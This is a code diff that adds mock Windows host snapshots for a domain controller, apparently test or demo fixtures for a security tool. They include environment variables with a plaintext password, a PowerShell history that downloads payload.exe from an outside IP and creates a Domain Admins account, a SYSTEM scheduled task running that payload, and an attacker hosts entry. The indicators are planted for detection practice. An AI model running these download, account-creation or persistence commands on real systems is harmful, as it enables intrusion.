@@ -856,5 +856,137 @@ export const mockSnapshots = {
         ['svc_web',  'pts/2', '10.10.1.30', '02:00', '00:05'],
       ]),
       14),
+
+    // ── env (DC01 — environment variables with a sensitive one) ──
+    snap('mock-snap-env-dc01', H.DC01, 'env', 'windows',
+      'COMPUTERNAME=DC01\n' +
+      'USERDOMAIN=CORP\n' +
+      'USERNAME=Administrator\n' +
+      'USERPROFILE=C:\\Users\\Administrator\n' +
+      'SystemRoot=C:\\Windows\n' +
+      'TEMP=C:\\Windows\\Temp\n' +
+      'TMP=C:\\Windows\\Temp\n' +
+      'JAVA_HOME=C:\\Program Files\\Java\\jdk-11\n' +
+      'PATH=C:\\Windows\\system32;C:\\Windows;C:\\Program Files\\Java\\jdk-11\\bin\n' +
+      'DB_PASSWORD=Summer2024!\n' +
+      'NUMBER_OF_PROCESSORS=4\n' +
+      'OS=Windows_NT\n' +
+      'PROCESSOR_ARCHITECTURE=AMD64',
+      18),
+
+    // ── history (DC01 — PowerShell history with lateral movement commands) ──
+    snap('mock-snap-history-dc01', H.DC01, 'history', 'windows',
+      'Get-ADUser -Filter * | Select Name,SamAccountName\n' +
+      'Get-ADComputer -Filter * | Select Name,DNSHostName\n' +
+      'Get-ADGroupMember "Domain Admins"\n' +
+      'Invoke-WebRequest -Uri http://185.220.101.34/payload.exe -OutFile C:\\Windows\\Temp\\update.exe\n' +
+      'net user svc_admin P@ssw0rd123! /add /domain\n' +
+      'net group "Domain Admins" svc_admin /add /domain\n' +
+      'Get-Process\n' +
+      'whoami /all\n' +
+      'ipconfig /all\n' +
+      'net share\n' +
+      'dir C:\\Users\\\n' +
+      'Get-LocalGroupMember Administrators\n',
+      18),
+
+    // ── schtasks (DC01 — scheduled tasks including SYSTEM one with odd path) ──
+    snap('mock-snap-schtasks-dc01', H.DC01, 'schtasks', 'windows',
+      'HostName:      DC01\n' +
+      'TaskName:      \\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start\n' +
+      'Run As User:   SYSTEM\n' +
+      'Task To Run:   COM handler\n' +
+      'Status:        Ready\n' +
+      'Next Run Time: N/A\n' +
+      'Last Run Time: N/A\n' +
+      '\n' +
+      'HostName:      DC01\n' +
+      'TaskName:      \\Microsoft\\Windows\\Defrag\\ScheduledDefrag\n' +
+      'Run As User:   SYSTEM\n' +
+      'Task To Run:   %windir%\\system32\\defrag.exe -c\n' +
+      'Status:        Ready\n' +
+      'Next Run Time: 3/16/2026 1:00:00 AM\n' +
+      'Last Run Time: 3/10/2026 1:00:00 AM\n' +
+      '\n' +
+      'HostName:      DC01\n' +
+      'TaskName:      \\Updater\n' +
+      'Run As User:   SYSTEM\n' +
+      'Task To Run:   C:\\Windows\\Temp\\update.exe /silent\n' +
+      'Status:        Running\n' +
+      'Next Run Time: 3/16/2026 12:00:00 AM\n' +
+      'Last Run Time: 3/15/2026 12:00:00 AM\n' +
+      '\n' +
+      'HostName:      DC01\n' +
+      'TaskName:      \\corp\\BackupJob\n' +
+      'Run As User:   CORP\\svc_backup\n' +
+      'Task To Run:   C:\\Scripts\\backup.ps1\n' +
+      'Status:        Ready\n' +
+      'Next Run Time: 3/16/2026 3:00:00 AM\n' +
+      'Last Run Time: 3/15/2026 3:00:00 AM\n',
+      18),
+
+    // ── services (DC01 — Get-Service Format-Table style) ──
+    snap('mock-snap-services-dc01', H.DC01, 'services', 'windows',
+      'Status   Name               DisplayName\n' +
+      '------   ----               -----------\n' +
+      'Running  ADWS               Active Directory Web Services\n' +
+      'Running  DNS                DNS Server\n' +
+      'Running  Kdc                Kerberos Key Distribution Center\n' +
+      'Running  LanmanServer       Server\n' +
+      'Running  lmhosts            TCP/IP NetBIOS Helper\n' +
+      'Running  MpsSvc             Windows Defender Firewall\n' +
+      'Running  MSSQLSERVER        SQL Server (MSSQLSERVER)\n' +
+      'Running  W32Time            Windows Time\n' +
+      'Stopped  PrintSpooler       Print Spooler\n' +
+      'Stopped  RemoteRegistry     Remote Registry\n' +
+      'Stopped  TelnetSvc          Telnet\n',
+      18),
+
+    // ── routes (DC01 — route print style) ──
+    snap('mock-snap-routes-dc01', H.DC01, 'routes', 'windows',
+      'Interface List\n' +
+      ' 4...00 50 56 a1 11 01 ......Intel(R) 82574L Gigabit Network Connection\n' +
+      '\n' +
+      'IPv4 Route Table\n' +
+      '===========================================================================\n' +
+      'Active Routes:\n' +
+      'Network Destination        Netmask          Gateway       Interface  Metric\n' +
+      '          0.0.0.0          0.0.0.0       10.10.1.1    10.10.1.5      10\n' +
+      '        10.10.1.0    255.255.255.0         On-link    10.10.1.5     266\n' +
+      '        10.10.2.0    255.255.255.0      10.10.1.254   10.10.1.5      20\n' +
+      '       10.10.10.0    255.255.255.0      10.10.1.200   10.10.1.5      30\n' +
+      '        127.0.0.0        255.0.0.0         On-link      127.0.0.1     306\n' +
+      '===========================================================================\n',
+      18),
+
+    // ── hostsfile (DC01 — custom entries pointing to internal services) ──
+    snap('mock-snap-hostsfile-dc01', H.DC01, 'hostsfile', 'windows',
+      '# Copyright (c) 1993-2009 Microsoft Corp.\n' +
+      '#\n' +
+      '# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\n' +
+      '#\n' +
+      '127.0.0.1       localhost\n' +
+      '::1             localhost\n' +
+      '10.10.1.5       dc01.corp.local dc01\n' +
+      '10.10.1.6       dc02.corp.local dc02\n' +
+      '10.10.2.30      jenkins.corp.local jenkins build\n' +
+      '192.168.100.1   attacker.redteam.local\n',
+      18),
+
+    // ── software (DC01 — Get-WmiObject Win32_Product style) ──
+    snap('mock-snap-software-dc01', H.DC01, 'software', 'windows',
+      'Name                                          Version\n' +
+      '----                                          -------\n' +
+      'Microsoft .NET Framework 4.8                  4.8.04084\n' +
+      'Microsoft Visual C++ 2019 Redistributable     14.29.30133\n' +
+      'Java 11.0.2 (64-bit)                          11.0.2\n' +
+      'Git for Windows                               2.39.0\n' +
+      'WinSCP 5.21.5                                 5.21.5\n' +
+      'PuTTY release 0.78                            0.78\n' +
+      'Notepad++ (64-bit x64)                        8.5.2\n' +
+      'Mozilla Firefox (x64 en-US)                   115.3.1\n' +
+      'Microsoft SQL Server 2019 (64-bit)            15.0.4335.1\n' +
+      'Wireshark 4.0.6 64-bit                        4.0.6\n',
+      18),
   ],
 };
